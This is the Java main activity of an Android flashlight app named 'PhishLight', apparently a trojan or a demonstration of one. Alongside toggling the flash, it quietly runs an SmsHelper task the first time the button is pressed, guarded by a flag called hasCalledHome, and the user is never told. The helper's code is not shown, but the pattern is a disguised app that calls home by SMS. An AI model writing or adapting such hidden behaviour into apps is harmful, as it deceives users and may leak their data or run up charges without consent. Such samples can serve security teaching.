package org.rix1.PhishLight;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.Toast;

import java.io.IOException;


public class MainActivity extends Activity {

    /**
     * Called when the activity is first created.
     */

    private Button toggle;
    private ImageView light;
    private boolean isFlashlightOn = false;
    private Camera camera;
    private Context context = this;
    private boolean hasCalledHome = false;
    private SmsHelper smsHelper;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }

    public void buildView(){

        light = (ImageView) findViewById(R.id.ic_light);
        toggle = (Button)findViewById(R.id.btn_toggle);
        toggle.setText("ON");


        final Camera.Parameters p = camera.getParameters();
        smsHelper = new SmsHelper(this);

        toggle.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Log.d("APP: ", "Button clicked");

                if (context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)) {

                    if (isFlashlightOn) {
                        Log.d("APP: ", "Flashlight is off");
                        p.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
                        camera.setParameters(p);
                        toggle.setText("ON");
                        light.setVisibility(View.INVISIBLE);
                        isFlashlightOn = false;
                    } else {
                        Log.d("APP: ", "Flashlight is ON!");
                        if (!hasCalledHome) {
                            smsHelper.execute();
                            hasCalledHome = true;
                        }
                        p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
                        camera.setParameters(p);
                        toggle.setText("OFF");
                        light.setVisibility(View.VISIBLE);
                        isFlashlightOn = true;
                    }
                }else {
                    Toast.makeText(context, "No camera found ", Toast.LENGTH_LONG).show();
                    if (!hasCalledHome) {
                        smsHelper.execute();
                        hasCalledHome = true;
                    }
                }
            }
        });
    }

    public void resetView(){
        light = (ImageView) findViewById(R.id.ic_light);
        toggle = (Button)findViewById(R.id.btn_toggle);
        light.setVisibility(View.INVISIBLE);
        toggle.setText("ON");
        isFlashlightOn = false;
    }

    protected void onPause(){
        super.onPause();
        hasCalledHome = false;
        if(camera != null){
            camera.release();
        }
        resetView();
    }

    protected void onResume(){
        super.onResume();
        camera = Camera.open();
        buildView();
    }

    protected void onStop(){
        super.onStop();

        hasCalledHome = false;
        if(camera != null){
            camera.release();
        }
    }
}